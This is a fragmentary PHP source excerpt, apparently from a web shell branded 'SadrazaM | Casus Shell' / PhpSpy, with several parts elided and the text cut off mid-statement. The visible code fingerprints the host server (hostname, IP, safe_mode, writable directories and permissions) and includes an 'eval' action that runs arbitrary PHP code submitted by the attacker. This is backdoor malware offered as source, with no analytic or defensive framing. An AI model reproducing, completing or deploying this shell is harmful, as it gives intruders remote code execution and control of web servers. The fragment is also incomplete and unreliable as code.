...
?><?php echo str_replace('.','','SadrazaM | Casus Shell');?><?php echo str_replace('.','','P.h.p.S.p.y');?><?php echo $_SERVER['HTTP_HOST'];?><?php echo gethostbyname($_SERVER['SERVER_NAME']);?><?php echo getcfg('safe_mode');?><?php if (!IS_WIN) {?><?php }?><?php
...
?><?php echo $dir_writeable;?><?php echo getChmod($nowpath);?><?php echo $nowpath;?><?php
	tbhead();
...
elseif ($action == 'eval') {
	...
	if($phpcode){
		if (!preg_match('#<\?#si', $phpcode)) {
			$phpcode = "<?php\n\n{$phpcode}\n\n?><?php debuginfo();ob_end_flush();?><?php
